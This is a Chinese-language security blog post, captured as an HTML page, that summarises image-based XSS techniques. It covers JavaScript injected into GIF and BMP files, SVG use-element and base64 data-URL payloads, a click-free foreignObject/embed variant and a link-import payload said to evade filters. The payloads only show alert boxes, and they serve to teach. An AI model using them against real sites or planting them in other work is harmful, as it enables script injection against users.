@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="最近做题遇到图片XSS的构造，这里就小结一下笔记吧。 图片XSS图片XSS，简单地说，就是将JavaScript代码尽量插入图片的无用区域，在不影响图片显示的情况下满足JS代码格式从而执行图片中的JS代码导致XSS。 注意：只对IE有效，Chrome和Firefox无法触发。 向gif文件中注入JavaScript的脚本：http://pastebin.com/6yUbfGX5 向bmp文件中注入">
+<meta name="keywords" content="Web安全,XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="图片XSS小结">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/index.html">
+<meta property="og:site_name" content="Mi1k7ea">
+<meta property="og:description" content="最近做题遇到图片XSS的构造，这里就小结一下笔记吧。 图片XSS图片XSS，简单地说，就是将JavaScript代码尽量插入图片的无用区域，在不影响图片显示的情况下满足JS代码格式从而执行图片中的JS代码导致XSS。 注意：只对IE有效，Chrome和Firefox无法触发。 向gif文件中注入JavaScript的脚本：http://pastebin.com/6yUbfGX5 向bmp文件中注入">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/22/图片XSS小结/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/22/图片XSS小结/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/22/图片XSS小结/3.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/22/图片XSS小结/4.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/22/图片XSS小结/5.png">
+<meta property="og:updated_time" content="2019-03-22T17:01:21.681Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="图片XSS小结">
+<meta name="twitter:description" content="最近做题遇到图片XSS的构造，这里就小结一下笔记吧。 图片XSS图片XSS，简单地说，就是将JavaScript代码尽量插入图片的无用区域，在不影响图片显示的情况下满足JS代码格式从而执行图片中的JS代码导致XSS。 注意：只对IE有效，Chrome和Firefox无法触发。 向gif文件中注入JavaScript的脚本：http://pastebin.com/6yUbfGX5 向bmp文件中注入">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/03/22/图片XSS小结/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>图片XSS小结</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">門面</a></li>
+         
+          <li><a href="/archives/">歸檔</a></li>
+         
+          <li><a href="/categories/">目錄</a></li>
+         
+          <li><a href="/tags/">標籤</a></li>
+         
+          <li><a href="/about/">吾</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回頂部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&text=图片XSS小结"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&title=图片XSS小结"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&is_video=false&description=图片XSS小结"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=图片XSS小结&body=Check out this article: https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&title=图片XSS小结"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&title=图片XSS小结"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&title=图片XSS小结"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&title=图片XSS小结"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&name=图片XSS小结&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#图片XSS"><span class="toc-number">1.</span> <span class="toc-text">图片XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SVG-XSS"><span class="toc-number">2.</span> <span class="toc-text">SVG XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#use元素"><span class="toc-number">2.1.</span> <span class="toc-text">use元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-url-Base64"><span class="toc-number">2.2.</span> <span class="toc-text">data:url+Base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无需点击——foreignObject元素"><span class="toc-number">2.3.</span> <span class="toc-text">无需点击——foreignObject元素</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#link-XSS"><span class="toc-number">3.</span> <span class="toc-text">link XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        图片XSS小结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Mi1k7ea</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-22T14:52:04.000Z" itemprop="datePublished">2019-03-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Web安全基础/">Web安全基础</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Web安全/">Web安全</a>, <a class="tag-link" href="/tags/XSS/">XSS</a>
+    </div>
+    <div class="article-tag">
+        <i class="fas fa-eye"></i>
+        阅读量：<span id="busuanzi_value_page_pv"></span>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>最近做题遇到图片XSS的构造，这里就小结一下笔记吧。</p>
+<h2 id="图片XSS"><a href="#图片XSS" class="headerlink" title="图片XSS"></a>图片XSS</h2><p>图片XSS，简单地说，就是将JavaScript代码尽量插入图片的无用区域，在不影响图片显示的情况下满足JS代码格式从而执行图片中的JS代码导致XSS。</p>
+<p><strong>注意：只对IE有效，Chrome和Firefox无法触发。</strong></p>
+<p>向gif文件中注入JavaScript的脚本：<a href="http://pastebin.com/6yUbfGX5" target="_blank" rel="noopener">http://pastebin.com/6yUbfGX5</a></p>
+<p>向bmp文件中注入JavaScript的脚本：<a href="http://pastebin.com/04y7ee3u" target="_blank" rel="noopener">http://pastebin.com/04y7ee3u</a></p>
+<p>gif图片插入payload：<code>python gif_injector.py -i flower.gif &quot;alert(&#39;Mi1k7ea&#39;);&quot;</code></p>
+<p>bmp图片插入payload：<code>python bmpinjector.py -i pain.bmp &quot;alert(location);&quot;</code></p>
+<p>写段页面代码加载该图片：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Image XSS Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"flower.gif_malw.gif"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"flower.gif_malw.gif"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>但是现在只剩gif可以执行XSS了，bmp不行：</p>
+<p><img src="/2019/03/22/图片XSS小结/1.png" alt=""></p>
+<h2 id="SVG-XSS"><a href="#SVG-XSS" class="headerlink" title="SVG XSS"></a>SVG XSS</h2><p>SVG是一种基于XML的图像文件格式。</p>
+<h3 id="use元素"><a href="#use元素" class="headerlink" title="use元素"></a>use元素</h3><p>SVG中的use元素用于重用其他元素，主要用于联接defs和alike，而我们却用它来引用外部SVG文件中的元素。</p>
+<p>元素通过其id被引用，在use标签的xlink:href属性中以’#’井字符开头，外部元素的引用同样如此。</p>
+<p>示例如下。</p>
+<p>pic.html：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">use</span> <span class="attr">xlink:href</span>=<span class="string">'exp.svg#m7'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>exp.svg：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">id</span>=<span class="string">"m7"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">"javascript:alert('Mi1k7ea')"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>.svg文件以svg标签开始，其id设置为m7，使用rect标签绘一个矩形。可以使用a环绕rect标签，这样会创建一个超链接。使用Javascript伪协议，可点击的超链接在点击后会执行Javascript。虽然SVG是经由use标签加载的，但是Javascript将会执行。有一点需要注意，它只能加载SVG文件，必须满足同源策略。</p>
+<p>可以看到测试结果，在chrome和Firefox下点击黑框都能弹框：</p>
+<p><img src="/2019/03/22/图片XSS小结/2.png" alt=""></p>
+<h3 id="data-url-Base64"><a href="#data-url-Base64" class="headerlink" title="data:url+Base64"></a>data:url+Base64</h3><p>由于加载的外部SVG文件必须是同源的，这个特性看起来似乎无法作为有用的XSS攻击向量，但可以使用data:url协议来帮我们提升这个攻击向量。</p>
+<p>首先，它允许我们从内部创建一个文件，要求正确的mime-type，在这里为image/svg+xml。mimie-type后是我们的攻击载荷或关键字base64。特别地，由于数据被base64编码，这有助于避免突破HTML结构的问题。</p>
+<p>现在我们不必再依赖于服务器上的另一个文件了，改进一下pic.html：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">use</span> <span class="attr">xlink:href</span>=<span class="string">"data:image/svg+xml;base64,PHN2ZyBpZD0ibTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4NCjxhIHhsaW5rOmhyZWY9ImphdmFzY3JpcHQ6YWxlcnQoJ1hTUyEnKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+#m7"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中base64加密的内容为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">id</span>=<span class="string">"m7"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">"javascript:alert('XSS!')"</span>&gt;</span><span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>但只能在Firefox中测试可行，点击黑框后能够成功触发：</p>
+<p><img src="/2019/03/22/图片XSS小结/3.png" alt=""></p>
+<h3 id="无需点击——foreignObject元素"><a href="#无需点击——foreignObject元素" class="headerlink" title="无需点击——foreignObject元素"></a>无需点击——foreignObject元素</h3><p>如果在exp.svg中写script标签是不会被解析，但是SVG支持foreignObject元素。</p>
+<p>通过阐述这个对象需要的扩展属性，有可能加载非SVG元素。这就意味着现在有可能是有iframe、embed及其他所有支持的HTML元素了，我们可以从一堆元素中进行选择执行Javascript，这里使用embed+JavascriptURL协议。</p>
+<p>pic.html：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">use</span> <span class="attr">xlink:href</span>=<span class="string">"data:image/svg+xml;base64,PHN2ZyBpZD0ibTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo8Zm9yZWlnbk9iamVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiByZXF1aXJlZEV4dGVuc2lvbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPgoJPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoNjY2KSIgLz4KPC9mb3JlaWduT2JqZWN0Pgo8L3N2Zz4=#m7"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中base64加密内容为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">id</span>=<span class="string">"m7"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foreignObject</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"50"</span> <span class="attr">requiredExtensions</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">embed</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">src</span>=<span class="string">"javascript:alert(666)"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foreignObject</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，在Firefox下，无需点击即可触发foreignObject标签内embed的JS伪协议执行JS代码从而弹框，同时没有弹框显示1说明了script标签不会被解析：</p>
+<p><img src="/2019/03/22/图片XSS小结/4.png" alt=""></p>
+<h2 id="link-XSS"><a href="#link-XSS" class="headerlink" title="link XSS"></a>link XSS</h2><p>前面利用use元素结合data:url只能在Firefox下生效，Chrome却不会触发。</p>
+<p>这里可利用link来bypass Chrome。</p>
+<p>示例pic.html如下，加密内容为<code>&lt;script&gt;alert(&quot;Hello&quot;);&lt;/script&gt;</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"import"</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在Chrome下成功执行（Firefox未成功）：</p>
+<p><img src="/2019/03/22/图片XSS小结/5.png" alt=""></p>
+<p>当然link的形式很多，href的地方本身就是可以插入js代码的，但是通过base64加密，可以bypass各种奇怪的过滤。</p>
+<p>这里很多用到了data类型的url，可参考如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data:,&lt;文本数据&gt;  </span><br><span class="line">data:text/plain,&lt;文本数据&gt;  </span><br><span class="line">data:text/html,&lt;HTML代码&gt;  </span><br><span class="line">data:text/html;base64,&lt;base64编码的HTML代码&gt;  </span><br><span class="line">data:text/css,&lt;CSS代码&gt;  </span><br><span class="line">data:text/css;base64,&lt;base64编码的CSS代码&gt;  </span><br><span class="line">data:text/javascript,&lt;Javascript代码&gt;  </span><br><span class="line">data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;  </span><br><span class="line">data:image/gif;base64,base64编码的gif图片数据  </span><br><span class="line">data:image/png;base64,base64编码的png图片数据  </span><br><span class="line">data:image/jpeg;base64,base64编码的jpeg图片数据  </span><br><span class="line">data:image/x-icon;base64,base64编码的icon图片数据</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.4hou.com/technology/3340.html" target="_blank" rel="noopener">浅析图片XSS中的哪些技术问题</a></p>
+<p><a href="https://www.cnblogs.com/r00tgrok/p/SVG_Build_XSS_Vector_Bypass_Firefox_And_Chrome.html" target="_blank" rel="noopener">用SVG绕过浏览器XSS审计</a></p>
+
+  </div>
+</article>
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<br><br>
+<div id="vcomments"></div>
+    <script>
+        new Valine({
+            av: AV,
+            el: '#vcomments',
+            appId: 'Jyl0XQwm2jIH31Tx16dygCNv-gzGzoHsz',
+            appKey: 'Iqq1VTg9X5EfKJt3MMIj8MMB',
+            placeholder: '大佬亲临寒站，可否指点一二',
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">門面</a></li>
+         
+          <li><a href="/archives/">歸檔</a></li>
+         
+          <li><a href="/categories/">目錄</a></li>
+         
+          <li><a href="/tags/">標籤</a></li>
+         
+          <li><a href="/about/">吾</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#图片XSS"><span class="toc-number">1.</span> <span class="toc-text">图片XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SVG-XSS"><span class="toc-number">2.</span> <span class="toc-text">SVG XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#use元素"><span class="toc-number">2.1.</span> <span class="toc-text">use元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-url-Base64"><span class="toc-number">2.2.</span> <span class="toc-text">data:url+Base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无需点击——foreignObject元素"><span class="toc-number">2.3.</span> <span class="toc-text">无需点击——foreignObject元素</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#link-XSS"><span class="toc-number">3.</span> <span class="toc-text">link XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&text=图片XSS小结"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&title=图片XSS小结"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&is_video=false&description=图片XSS小结"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=图片XSS小结&body=Check out this article: https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&title=图片XSS小结"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&title=图片XSS小结"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&title=图片XSS小结"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&title=图片XSS小结"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/&name=图片XSS小结&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="false"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回頂部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Mi1k7ea
+  </div>
+  <span id="busuanzi_container_site_pv"> 
+    <i class="fas fa-eye"></i>
+    过客：<span id="busuanzi_value_site_uv"></span>
+  </span>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">門面</a></li>
+         
+          <li><a href="/archives/">歸檔</a></li>
+         
+          <li><a href="/categories/">目錄</a></li>
+         
+          <li><a href="/tags/">標籤</a></li>
+         
+          <li><a href="/about/">吾</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
